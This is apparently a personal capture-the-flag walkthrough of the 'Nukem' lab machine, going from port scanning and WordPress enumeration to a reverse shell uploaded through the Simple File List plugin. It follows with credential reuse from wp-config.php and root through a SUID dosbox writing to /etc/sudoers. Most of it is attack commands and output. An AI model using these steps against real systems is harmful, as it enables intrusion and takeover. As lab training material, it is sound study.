@@ -1,0 +1,171 @@
+																							                   Nukem Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.105
+export IP=192.168.68.105
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp    open  ssh
+80/tcp    open  http
+3306/tcp  open  mysql
+5000/tcp  open  upnp
+13000/tcp open  unknown
+36445/tcp open  unknown
+
+
+nmap -Pn -n -sC -sV -p22,80,3306,5000,13000,36445 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
+80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
+|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
+|_http-generator: WordPress 5.5.1
+|_http-title: Retro Gamming &#8211; Just another WordPress site
+3306/tcp  open  mysql?
+| fingerprint-strings: 
+|_    Host '192.168.49.68' is not allowed to connect to this MariaDB server
+5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
+13000/tcp open  http        nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Login V14
+36445/tcp open  netbios-ssn Samba smbd 4.6.2
+
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000 
+ <!-- nothing -->
+ 
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+
+nikto --url $IP
+
+Port 80
+
+http://192.168.68.105/index.php/dashboard/          -- login page
+
+Theme: news-vibrant by CodeVibrant      # check for known exploits
+
+http://192.168.68.105/wp-login.php         # wordpress login page 5.5.1
+
+# Ok, let's go after wordpress first
+
+wpscan --url http://$IP --no-update --disable-tls-checks --enumerate p --enumerate t --enumerate u
+
+users identified : admin
+WordPress theme in use: news-vibrant
+
+# Search for out-dated/vulnerable plugins
+
+wpscan --url http://$IP/wordpress/ --no-update --disable-tls-checks --enumerate p 
+wpscan --url http://$IP/ --plugins-detection aggressive
+
+plugins detected: tutor     v 1.5.3                         # WordPress Plugin Tutor.1.5.3 - Local File Inclusion      | php/webapps/48058.txt             
+                         simple-file-list   v 4.2.2              # WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload                              | php/webapps/48979.py
+                                                                           WordPress Plugin Simple File List 4.2.2 - Remote Code Execution                          | php/webapps/48449.py
+                         akismet   v 4.1.6                       # only XSS and CSRF
+                         make-paths-relative v 1.1.2        # no vulns
+                         relative-url v 0.1.7                    # no vulns
+
+#  simple-file-list   v 4.2.2              # WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload                              | php/webapps/48979.py
+can't seem to be making the new exploit to work, let's search for an older version of the exploit.
+
+
+ Exploitation steps
+1. Create a php file in the same folder as the exploit containg a reverse_shell.php code. (Try port 80)
+  https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/main/reverse_shell.php            # evidently, configure the host and proper IP
+2. [*] Enter File Name (working directory): reverse_shell.php
+    [*] Enter protocol (http/https): http
+    [+] File renamed to reverse_shell.png
+    [^-^] Exploit seems to have worked...
+       URL: http://192.168.68.105/wp-content/uploads/simple-file-list/reverse_shell.php
+# Shell it
+3. nc -lvnp 80
+4. Access http://192.168.68.105/wp-content/uploads/simple-file-list/reverse_shell.php      # you should obtain a shell of the system
+
+Got shell!
+
+
+Port 5000
+searchsploit Werkzeug
+Werkzeug - 'Debug Shell' Command Execution                                                                                                           | multiple/remote/43905.p
+
+python2 43905.py $IP 5000 192.168.49.68 4444       # [-] Debug is not enabled
+
+Port 13000
+Enumeration
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --hc 404 -t 30 "http://$IP/13000/FUZZ" 
+
+Default & Common credentials               # nothing
+SQL Injection                                       # nothing
+
+
+
+Privilege escalation
+
+pwd
+/srv/http/wp-content/uploads/simple-file-list
+
+cd /srv/http
+cat wp-config.php
+
+DB_NAME = wordpress
+DB_USER = commander
+DB_PASSWORD = CommanderKeenVorticons1990                                      # password reuse ?
+
+su commander
+CommanderKeenVorticons1990
+
+netstat -tunlp
+127.0.0.1:5901                                                                                        # VNC
+tcp6   :::3306
+tcp6   :::36445
+
+cd /home/commander/.vnc                                                                   # might be usefull later on
+4.0K -rw-------  1 commander commander    8 Sep 18  2020 passwd
+
+mysql -ucommander -pCommanderKeenVorticons1990                                    # waste of time
+
+
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/dosbox                   # gtfobins the sucker. I've tried many ways to overwrite or write data to /etc/passwd or /etc/shadow with no luck for some reason. However I managed to get root by modyfing /etc/sudoers
+
+Method 1:
+/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >> c:/etc/sudoers" -c exit
+
+sudo su
+CommanderKeenVorticons1990
+whoami
+root
+cd /root
+cat proof.txt                            # Flag: 284d8d8b9b6d571e83c1383a5de816ea
+
+                                             Aparently dosbox it's a application that gives you a windows cmd on a linux machine. Since we have VNC already available at port 5901, 
+                                             let's use a technique called SSH tunneling to tunnel this port to my local machine so we can access it!
+
+Method 2: If Dosbox won't start in the console. You'll have to get access the gaphical interface. Fortunately, a VNC session is running on this server on port 5901.
+SSH tunneling / SSH Port Forwarding
+
+# use port redirection to try to reach this service
+ssh -L 5901:localhost:5901 commander@192.168.120.55
+
+# verify the tunnel
+netstat -antup          
+tcp  127.0.0.1:5901   127.0.0.1:48666   ESTABLISHED 189619/ssh
+
+# Connect to VNC
+vncviewer localhost:5901
+Password: CommanderKeenVorticons1990
+or
+remmina 
+
+# Open dosbox from terminal
+   In order to access C: partition we need to mount /etc/ directory from C: partition
+   
+Z:\> mount C /etc
+Z:\> C:
+C:\> echo commander ALL=(ALL) ALL >> sudoers
+
+# Switch back to your shell and obtain access to root account
+sudo su
+CommanderKeenVorticons1990
